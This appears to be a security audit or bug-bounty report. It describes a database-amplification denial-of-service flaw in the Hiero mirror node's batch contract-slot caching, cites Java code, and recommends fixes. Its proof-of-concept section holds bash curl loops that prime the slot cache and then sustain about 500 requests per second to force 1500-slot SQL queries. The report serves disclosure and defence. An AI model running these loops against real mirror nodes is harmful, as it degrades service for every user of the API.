### Title
Cache-Amplified SQL IN-Clause DoS via Batch Contract Slot Preloading

### Summary
When `enableBatchContractSlotCaching` is `true` (the default), `findStorageBatch()` always issues a SQL `IN`-clause query containing every slot key currently held in the per-contract Caffeine cache. An unprivileged attacker can prime that cache to its maximum of 1500 entries, then repeatedly trigger single-slot reads after the 2-second `contractStateCache` TTL expires, causing every individual storage read to generate a 1500-element SQL `IN`-clause query instead of a single-key lookup — a 1500× DB amplification factor per request.

### Finding Description

**Exact code path:**

`ContractStateServiceImpl.findStorage()` — [1](#0-0) 

When `enableBatchContractSlotCaching` is `true` and the `contractStateCache` misses, execution falls through to `findStorageBatch()`.

`ContractStateServiceImpl.findStorageBatch()` — [2](#0-1) 

Line 91 snapshots **all** keys currently in the per-contract Caffeine cache (`cachedSlotKeys`), and line 103 passes the entire list to `findStorageBatch`. There is no cap on how many slots are included.

The SQL query issued is:
```sql
select slot, value from contract_state
where contract_id = :contractId
and slot in (:slots)   -- up to 1500 entries
``` [3](#0-2) 

**Cache configuration:**
- `slotsPerContract`: `expireAfterAccess=5m, maximumSize=1500` — slot keys live for 5 minutes after last access; up to 1500 per contract.
- `contractState`: `expireAfterWrite=2s, maximumSize=25000` — slot values expire every 2 seconds. [4](#0-3) 

**Root cause:** The batch query size is bounded only by the `slotsPerContract` cache size (1500), not by the number of slots actually needed for the current request. Once the per-contract slot cache is full, every cache-miss on `contractStateCache` (which happens every 2 seconds by design) triggers a 1500-slot SQL `IN`-clause for a single-slot read.

**Why existing checks fail:**

The throttle operates at the HTTP request level — 500 requests/second and a gas-per-second bucket: [5](#0-4) 

Neither the request-rate bucket nor the gas bucket accounts for the number of DB slot lookups generated per request. A single `eth_call` consuming 1 rate-limit token can cause 1500 DB row lookups.

### Impact Explanation
At the default 500 req/s rate limit, an attacker sustaining the primed state forces up to 500 × 1500 = **750,000 DB slot lookups per second** instead of the baseline 500 × 1 = 500. This is a **1500× amplification** of database I/O per request, far exceeding the 30% threshold. Sustained pressure can exhaust DB connection pools, increase query latency for all users, and degrade or halt the mirror node's web3 API.

### Likelihood Explanation
No authentication or special privilege is required — `eth_call` is a public, unauthenticated endpoint. Priming requires only ~1500 API calls (≈3 seconds at the rate limit). The attack is then self-sustaining: the `slotsPerContract` cache retains keys for 5 minutes after last access, and the attacker only needs to make one read every 2 seconds to keep triggering full 1500-slot batch queries. The attack is trivially scriptable and repeatable.

### Recommendation
1. **Cap the batch size**: Before calling `findStorageBatch`, limit `cachedSlots` to a configurable maximum (e.g., 100 slots) to bound the SQL `IN`-clause size regardless of cache state.
2. **Decouple slot-key accumulation from the query**: Only include slot keys that were previously requested in the same EVM execution context, not the entire per-contract cache snapshot.
3. **Account for batch size in throttling**: Consume tokens from the rate-limit bucket proportional to the number of slots in the batch query, not just 1 per HTTP request.
4. **Reduce `slotsPerContract` maximumSize** or add a per-request cap to limit worst-case query width.

### Proof of Concept

**Preconditions:** Mirror node running with default config (`enableBatchContractSlotCaching=true`, `slotsPerContract` max=1500, `contractState` TTL=2s).

**Step 1 — Prime the cache (fill slotsPerContract to 1500 for contract `0xTARGET`):**
```bash
for i in $(seq 1 1500); do
  SLOT=$(printf '%064x' $i)
  curl -s -X POST http://mirror-node/api/v1/contracts/call \
    -H 'Content-Type: application/json' \
    -d "{\"to\":\"0xTARGET\",\"data\":\"0x$(python3 -c "print('2e52d606' + '${SLOT}')") \"}"
done
```

**Step 2 — Wait 2 seconds** for `contractStateCache` to expire.

**Step 3 — Sustain the amplified load:**
```bash
while true; do
  curl -s -X POST http://mirror-node/api/v1/contracts/call \
    -H 'Content-Type: application/json' \
    -d '{"to":"0xTARGET","data":"0x<any-single-slot-read>"}'
  sleep 0.002  # 500 req/s
done
```

Each request in Step 3 misses `contractStateCache` (expired), enters `findStorageBatch`, snapshots all 1500 cached slot keys, and issues `SELECT ... WHERE slot IN (<1500 values>)` — 1500× the expected DB cost per request.

### Citations

**File:** web3/src/main/java/org/hiero/mirror/web3/service/ContractStateServiceImpl.java (L58-70)
```java
    public Optional<byte[]> findStorage(final EntityId contractId, final byte[] key) {
        if (!cacheProperties.isEnableBatchContractSlotCaching()) {
            return contractStateRepository.findStorage(contractId.getId(), key);
        }

        final var cachedValue = contractStateCache.get(generateCacheKey(contractId, key), byte[].class);

        if (cachedValue != null && cachedValue != EMPTY_VALUE) {
            return Optional.of(cachedValue);
        }

        return findStorageBatch(contractId, key);
    }
```

**File:** web3/src/main/java/org/hiero/mirror/web3/service/ContractStateServiceImpl.java (L85-103)
```java
    private Optional<byte[]> findStorageBatch(final EntityId contractId, final byte[] key) {
        final var contractSlotsCache = ((CaffeineCache) this.contractSlotsCache.get(
                contractId, () -> cacheManagerSlotsPerContract.getCache(contractId.toString())));
        final var wrappedKey = ByteBuffer.wrap(key);
        // Cached slot keys for contract, whose slot values are not present in the contractStateCache
        contractSlotsCache.putIfAbsent(wrappedKey, EMPTY_VALUE);
        final var cachedSlotKeys = contractSlotsCache.getNativeCache().asMap().keySet();

        final var cachedSlots = new ArrayList<byte[]>(cachedSlotKeys.size());
        boolean isKeyEvictedFromCache = true;

        for (var slot : cachedSlotKeys) {
            cachedSlots.add(((ByteBuffer) slot).array());
            if (wrappedKey.equals(slot)) {
                isKeyEvictedFromCache = false;
            }
        }

        final var contractSlotValues = contractStateRepository.findStorageBatch(contractId.getId(), cachedSlots);
```

**File:** web3/src/main/java/org/hiero/mirror/web3/repository/ContractStateRepository.java (L23-28)
```java
    @Query(value = """
                    select slot, value from contract_state
                    where contract_id = :contractId
                    and slot in (:slots)
                    """, nativeQuery = true)
    List<ContractSlotValue> findStorageBatch(@Param("contractId") Long contractId, @Param("slots") List<byte[]> slots);
```

**File:** web3/src/main/java/org/hiero/mirror/web3/repository/properties/CacheProperties.java (L28-39)
```java
    private String contractState = "expireAfterWrite=2s,maximumSize=25000,recordStats";

    private boolean enableBatchContractSlotCaching = true;

    @NotBlank
    private String entity = ENTITY_CACHE_CONFIG;

    @NotBlank
    private String fee = "expireAfterWrite=60m,maximumSize=20,recordStats";

    @NotBlank
    private String slotsPerContract = "expireAfterAccess=5m,maximumSize=1500";
```

**File:** web3/src/main/java/org/hiero/mirror/web3/throttle/ThrottleManagerImpl.java (L37-43)
```java
    public void throttle(ContractCallRequest request) {
        if (!rateLimitBucket.tryConsume(1)) {
            throw new ThrottleException(REQUEST_PER_SECOND_LIMIT_EXCEEDED);
        } else if (!gasLimitBucket.tryConsume(throttleProperties.scaleGas(request.getGas()))) {
            throw new ThrottleException(GAS_PER_SECOND_LIMIT_EXCEEDED);
        }

```
